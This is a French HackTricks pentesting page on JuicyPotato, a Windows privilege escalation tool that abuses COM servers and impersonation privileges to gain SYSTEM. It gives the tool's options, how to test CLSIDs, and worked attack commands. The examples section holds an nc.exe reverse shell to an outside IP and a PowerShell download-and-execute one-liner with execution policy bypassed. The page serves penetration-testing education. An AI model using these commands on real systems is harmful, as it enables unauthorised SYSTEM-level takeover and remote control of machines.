# JuicyPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et plus. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) peuvent être utilisés pour **exploiter les mêmes privilèges et obtenir un accès de niveau `NT AUTHORITY\SYSTEM`**. _**Vérifier :**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (abus des privilèges dorés) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Une version sucrée de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, avec un peu de jus, c'est-à-dire **un autre outil d'escalade de privilèges locaux, à partir de comptes de service Windows vers NT AUTHORITY\SYSTEM**_

#### Vous pouvez télécharger juicypotato depuis [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Résumé <a href="#summary" id="summary"></a>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) et ses [variantes](https://github.com/decoder-it/lonelypotato) exploitent la chaîne d'escalade de privilèges basée sur le service [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ayant l'écouteur MiTM sur `127.0.0.1:6666` et lorsque vous avez les privilèges `SeImpersonate` ou `SeAssignPrimaryToken`. Lors d'une revue de construction Windows, nous avons trouvé une configuration où `BITS` était intentionnellement désactivé et le port `6666` était pris.

Nous avons décidé de transformer [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) en arme : **Dites bonjour à Juicy Potato**.

> Pour la théorie, voir [Rotten Potato - Escalade de privilèges à partir de comptes de service vers SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) et suivre la chaîne de liens et de références.

Nous avons découvert qu'en dehors de `BITS`, il existe plusieurs serveurs COM que nous pouvons exploiter. Ils doivent simplement :

1. être instanciables par l'utilisateur actuel, normalement un "utilisateur de service" qui a des privilèges d'impersonation
2. implémenter l'interface `IMarshal`
3. s'exécuter en tant qu'utilisateur élevé (SYSTEM, Administrateur, ...)

Après quelques tests, nous avons obtenu et testé une liste étendue de [CLSID intéressants](http://ohpe.it/juicy-potato/CLSID/) sur plusieurs versions de Windows.

### Détails juteux <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vous permet de :

* **Cibler CLSID** _choisissez n'importe quel CLSID que vous voulez._ [_Ici_](http://ohpe.it/juicy-potato/CLSID/) _vous pouvez trouver la liste organisée par OS._
* **Port d'écoute COM** _définir le port d'écoute COM que vous préférez (au lieu du 6666 codé en dur)_
* **Adresse IP d'écoute COM** _lier le serveur sur n'importe quelle IP_
* **Mode de création de processus** _en fonction des privilèges de l'utilisateur impersonné, vous pouvez choisir parmi :_
  * `CreateProcessWithToken` (nécessite `SeImpersonate`)
  * `CreateProcessAsUser` (nécessite `SeAssignPrimaryToken`)
  * `les deux`
* **Processus à lancer** _lancer un exécutable ou un script si l'exploitation réussit_
* **Argument de processus** _personnaliser les arguments du processus lancé_
* **Adresse du serveur RPC** _pour une approche furtive, vous pouvez vous authentifier auprès d'un serveur RPC externe_
* **Port du serveur RPC** _utile si vous voulez vous authentifier auprès d'un serveur externe et que le pare-feu bloque le port `135`..._
* **Mode TEST** _principalement à des fins de test, c'est-à-dire tester les CLSID. Il crée le DCOM et imprime l'utilisateur du jeton. Voir_ [_ici pour les tests_](http://ohpe.it/juicy-potato/Test/)

### Utilisation <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Réflexions finales <a href="#final-thoughts" id="final-thoughts"></a>

Si l'utilisateur dispose des privilèges `SeImpersonate` ou `SeAssignPrimaryToken`, alors vous êtes **SYSTEM**.

Il est presque impossible d'empêcher l'abus de tous ces serveurs COM. Vous pourriez penser à modifier les autorisations de ces objets via `DCOMCNFG`, mais bonne chance, cela va être difficile.

La solution réelle consiste à protéger les comptes et les applications sensibles qui s'exécutent sous les comptes `* SERVICE`. L'arrêt de `DCOM` inhiberait certainement cette exploitation, mais pourrait avoir un impact sérieux sur le système d'exploitation sous-jacent.

À partir de : [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Exemples

Note : Visitez [cette page](https://ohpe.it/juicy-potato/CLSID/) pour une liste de CLSID à essayer.

### Obtenir un shell inversé nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell inversé
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Lancer une nouvelle CMD (si vous avez accès RDP)

![](<../../.gitbook/assets/image (37).png>)

## Problèmes de CLSID

Souvent, le CLSID par défaut que JuicyPotato utilise **ne fonctionne pas** et l'exploit échoue. Habituellement, il faut plusieurs tentatives pour trouver un **CLSID fonctionnel**. Pour obtenir une liste de CLSID à essayer pour un système d'exploitation spécifique, vous devriez visiter cette page:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Vérification des CLSID**

Tout d'abord, vous aurez besoin de certains exécutables en plus de juicypotato.exe.

Téléchargez [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) et chargez-le dans votre session PS, et téléchargez et exécutez [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ce script créera une liste de CLSID possibles à tester.

Ensuite, téléchargez [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(changez le chemin vers la liste CLSID et vers l'exécutable juicypotato) et exécutez-le. Il commencera à essayer chaque CLSID, et **lorsque le numéro de port change, cela signifie que le CLSID a fonctionné**.

**Vérifiez** les CLSID fonctionnels **en utilisant le paramètre -c** 

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
